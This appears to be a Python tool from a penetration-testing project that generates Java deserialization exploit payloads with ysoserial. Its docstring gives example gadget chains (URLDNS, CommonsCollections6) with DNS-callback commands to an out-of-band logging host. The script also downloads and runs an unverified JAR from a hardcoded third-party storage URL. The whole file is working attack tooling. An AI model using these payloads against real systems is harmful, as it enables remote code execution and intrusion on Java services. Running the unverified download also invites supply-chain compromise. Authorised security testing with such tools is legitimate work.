#!/usr/bin/env python3
"""
Generate Java deserialization payloads with ysoserial.

The script looks for an existing ysoserial JAR in tools/ first. If none is
present, it downloads the configured ZIP archive and installs the JAR directly
into tools/ysoserial.jar.

Examples:
    python scripts/deserialization_payload.py --ensure
    python scripts/deserialization_payload.py --list
    python scripts/deserialization_payload.py \
        --gadget URLDNS \
        --command "http://unique-id.example.dnslog.cn" \
        --output payload.bin
    python scripts/deserialization_payload.py \
        --gadget CommonsCollections6 \
        --command "nslookup unique-id.example.dnslog.cn" \
        --format base64 \
        --output payload.b64
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import shutil
import subprocess
import sys
import tempfile
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from pathlib import Path


SCRIPT_DIR = Path(__file__).resolve().parent
PROJECT_ROOT = SCRIPT_DIR.parent
TOOLS_DIR = PROJECT_ROOT / "tools"
DEFAULT_JAR_PATH = TOOLS_DIR / "ysoserial.jar"
DEFAULT_DOWNLOAD_URL = "https://ok-tools.oss-cn-beijing.aliyuncs.com/ysoseria.zip"
DEFAULT_TIMEOUT = 120
JAR_ENV = "YSOSERIAL_JAR"


def jar_name_score(path: Path) -> tuple[int, str]:
    """Prefer the canonical name, then other ysoserial-like JAR names."""
    name = path.name.lower()
    if name == "ysoserial.jar":
        rank = 0
    elif name == "ysoseria.jar":
        rank = 1
    elif "ysoserial" in name:
        rank = 2
    elif "ysoseria" in name:
        rank = 3
    else:
        rank = 4
    return rank, name


def is_ysoserial_candidate(path: Path) -> bool:
    name = path.name.lower()
    return (
        path.is_file()
        and path.suffix.lower() == ".jar"
        and ("ysoserial" in name or "ysoseria" in name)
    )


def find_existing_jar(explicit_path: str = "") -> Path | None:
    """Resolve an explicitly configured JAR or find one directly in tools/."""
    configured = explicit_path.strip() or os.environ.get(JAR_ENV, "").strip()
    if configured:
        path = Path(configured).expanduser().resolve()
        if not path.is_file():
            raise FileNotFoundError(f"指定的 ysoserial JAR 不存在: {path}")
        return path

    if not TOOLS_DIR.is_dir():
        return None

    candidates = sorted(
        (path for path in TOOLS_DIR.iterdir() if is_ysoserial_candidate(path)),
        key=jar_name_score,
    )
    return candidates[0].resolve() if candidates else None


def safe_zip_members(archive: zipfile.ZipFile, destination: Path):
    """Yield ZIP members whose resolved paths remain inside destination."""
    destination = destination.resolve()
    for member in archive.infolist():
        member_path = Path(member.filename)
        if member_path.is_absolute():
            raise ValueError(f"ZIP 包含绝对路径: {member.filename}")
        target = (destination / member.filename).resolve()
        try:
            target.relative_to(destination)
        except ValueError as exc:
            raise ValueError(f"ZIP 包含非法路径: {member.filename}") from exc
        yield member


def choose_jar(extract_dir: Path) -> Path:
    jars = [path for path in extract_dir.rglob("*.jar") if path.is_file()]
    ysoserial_jars = [path for path in jars if is_ysoserial_candidate(path)]
    candidates = ysoserial_jars or jars
    if not candidates:
        raise FileNotFoundError("下载的 ZIP 中没有找到 JAR 文件")
    if len(candidates) > 1 and not ysoserial_jars:
        names = ", ".join(sorted(path.name for path in candidates))
        raise RuntimeError(f"ZIP 中存在多个 JAR，无法确定 ysoserial 文件: {names}")
    return sorted(candidates, key=jar_name_score)[0]


def download_and_install(url: str, timeout: int) -> Path:
    """Download the ysoserial ZIP and install its JAR directly into tools/."""
    TOOLS_DIR.mkdir(parents=True, exist_ok=True)
    request = urllib.request.Request(
        url,
        headers={"User-Agent": "vibe-pentest-deserialization-payload/1.0"},
    )

    with tempfile.TemporaryDirectory(
        prefix="ysoserial-install-", dir=str(TOOLS_DIR)
    ) as temp_dir_text:
        temp_dir = Path(temp_dir_text)
        archive_path = temp_dir / "ysoserial.zip"
        extract_dir = temp_dir / "extract"
        extract_dir.mkdir()

        print(f"未发现本地 ysoserial JAR，正在下载: {url}", file=sys.stderr)
        try:
            with urllib.request.urlopen(request, timeout=timeout) as response:
                with open(archive_path, "wb") as output:
                    shutil.copyfileobj(response, output)
        except (urllib.error.URLError, TimeoutError, OSError) as exc:
            raise RuntimeError(f"下载 ysoserial 失败: {exc}") from exc

        if not zipfile.is_zipfile(archive_path):
            raise ValueError("下载内容不是有效的 ZIP 文件")

        with zipfile.ZipFile(archive_path) as archive:
            members = list(safe_zip_members(archive, extract_dir))
            archive.extractall(extract_dir, members=members)

        source_jar = choose_jar(extract_dir)
        staging_path = TOOLS_DIR / ".ysoserial.jar.tmp"
        shutil.copyfile(source_jar, staging_path)
        staging_path.replace(DEFAULT_JAR_PATH)

    print(f"ysoserial 已安装到: {DEFAULT_JAR_PATH}", file=sys.stderr)
    return DEFAULT_JAR_PATH.resolve()


def ensure_jar(explicit_path: str, download_url: str, timeout: int) -> Path:
    existing = find_existing_jar(explicit_path)
    if existing:
        return existing
    return download_and_install(download_url, timeout)


def resolve_java(explicit_path: str = "") -> str:
    configured = explicit_path.strip()
    if configured:
        path = Path(configured).expanduser()
        if path.is_file():
            return str(path.resolve())
        resolved = shutil.which(configured)
        if resolved:
            return resolved
        raise FileNotFoundError(f"找不到 Java 可执行文件: {configured}")

    resolved = shutil.which("java")
    if not resolved:
        raise FileNotFoundError(
            "找不到 Java。请安装 JRE/JDK，或使用 --java 指定 java 可执行文件"
        )
    return resolved


def run_ysoserial(
    java_path: str,
    jar_path: Path,
    arguments: list[str],
    timeout: int,
) -> subprocess.CompletedProcess:
    try:
        return subprocess.run(
            [java_path, "-jar", str(jar_path), *arguments],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=timeout,
            check=False,
        )
    except subprocess.TimeoutExpired as exc:
        raise RuntimeError(f"ysoserial 执行超时（{timeout} 秒）") from exc
    except OSError as exc:
        raise RuntimeError(f"无法执行 ysoserial: {exc}") from exc


def render_process_error(result: subprocess.CompletedProcess) -> str:
    stderr = result.stderr.decode("utf-8", errors="replace").strip()
    stdout = result.stdout.decode("utf-8", errors="replace").strip()
    detail = stderr or stdout or f"退出码 {result.returncode}"
    return f"ysoserial 执行失败: {detail}"


def encode_payload(payload: bytes, output_format: str) -> bytes:
    if output_format == "raw":
        return payload
    if output_format == "base64":
        return base64.b64encode(payload)
    if output_format == "hex":
        return payload.hex().encode("ascii")
    if output_format == "url":
        encoded = urllib.parse.quote_from_bytes(payload, safe="")
        return encoded.encode("ascii")
    raise ValueError(f"不支持的输出格式: {output_format}")


def write_payload(payload: bytes, output_path: str, output_format: str) -> None:
    if output_path == "-":
        if output_format == "raw":
            sys.stdout.buffer.write(payload)
        else:
            sys.stdout.write(payload.decode("ascii") + "\n")
        return

    destination = Path(output_path).expanduser()
    destination.parent.mkdir(parents=True, exist_ok=True)
    destination.write_bytes(payload)
    print(f"Payload 已写入: {destination.resolve()}", file=sys.stderr)


def print_list(result: subprocess.CompletedProcess) -> None:
    combined = result.stderr + result.stdout
    text = combined.decode("utf-8", errors="replace").strip()
    if not text:
        raise RuntimeError(render_process_error(result))
    encoding = sys.stdout.encoding or "utf-8"
    sys.stdout.buffer.write(text.encode(encoding, errors="replace"))
    sys.stdout.buffer.write(b"\n")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="使用 ysoserial 生成 Java 反序列化 Payload"
    )
    action = parser.add_mutually_exclusive_group()
    action.add_argument(
        "--ensure",
        action="store_true",
        help="只检查或下载 ysoserial JAR，不生成 Payload",
    )
    action.add_argument(
        "--list",
        action="store_true",
        help="列出当前 ysoserial JAR 支持的 gadget",
    )
    parser.add_argument("--gadget", help="ysoserial gadget 名称，例如 URLDNS")
    parser.add_argument(
        "--command",
        help="传给 gadget 的命令或 URL，例如 http://token.dnslog.cn",
    )
    parser.add_argument(
        "--format",
        choices=["raw", "base64", "hex", "url"],
        default="raw",
        help="Payload 输出格式，默认 raw",
    )
    parser.add_argument(
        "--output",
        default="payload.bin",
        help="输出文件；使用 - 输出到 stdout，默认 payload.bin",
    )
    parser.add_argument(
        "--jar",
        default="",
        help=f"显式指定 ysoserial JAR；也可设置环境变量 {JAR_ENV}",
    )
    parser.add_argument(
        "--java",
        default="",
        help="Java 可执行文件路径或命令名，默认从 PATH 查找 java",
    )
    parser.add_argument(
        "--download-url",
        default=DEFAULT_DOWNLOAD_URL,
        help="本地不存在 JAR 时使用的 ZIP 下载地址",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=DEFAULT_TIMEOUT,
        help=f"下载和执行超时秒数，默认 {DEFAULT_TIMEOUT}",
    )
    parser.add_argument(
        "--json",
        action="store_true",
        help="在 --ensure 或生成完成后输出 JSON 摘要",
    )
    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()
    timeout = max(1, args.timeout)

    if not args.ensure and not args.list:
        if not args.gadget:
            parser.error("生成 Payload 时必须提供 --gadget")
        if args.command is None:
            parser.error("生成 Payload 时必须提供 --command")
        if args.output == "-" and args.json:
            parser.error("--output - 不能与 --json 同时使用")

    try:
        jar_path = ensure_jar(args.jar, args.download_url, timeout)

        if args.ensure:
            result = {"status": "success", "jar": str(jar_path)}
            if args.json:
                print(json.dumps(result, ensure_ascii=False, indent=2))
            else:
                print(f"ysoserial JAR: {jar_path}")
            return 0

        java_path = resolve_java(args.java)
        if args.list:
            result = run_ysoserial(java_path, jar_path, [], timeout)
            print_list(result)
            return 0

        result = run_ysoserial(
            java_path,
            jar_path,
            [args.gadget, args.command],
            timeout,
        )
        if result.returncode != 0:
            raise RuntimeError(render_process_error(result))
        if not result.stdout:
            raise RuntimeError("ysoserial 未生成任何 Payload 数据")

        encoded_payload = encode_payload(result.stdout, args.format)
        write_payload(encoded_payload, args.output, args.format)
        if args.json:
            summary = {
                "status": "success",
                "jar": str(jar_path),
                "gadget": args.gadget,
                "format": args.format,
                "raw_size": len(result.stdout),
                "output_size": len(encoded_payload),
                "output": args.output,
            }
            print(json.dumps(summary, ensure_ascii=False, indent=2))
        return 0
    except (FileNotFoundError, RuntimeError, ValueError, zipfile.BadZipFile) as exc:
        print(f"错误: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
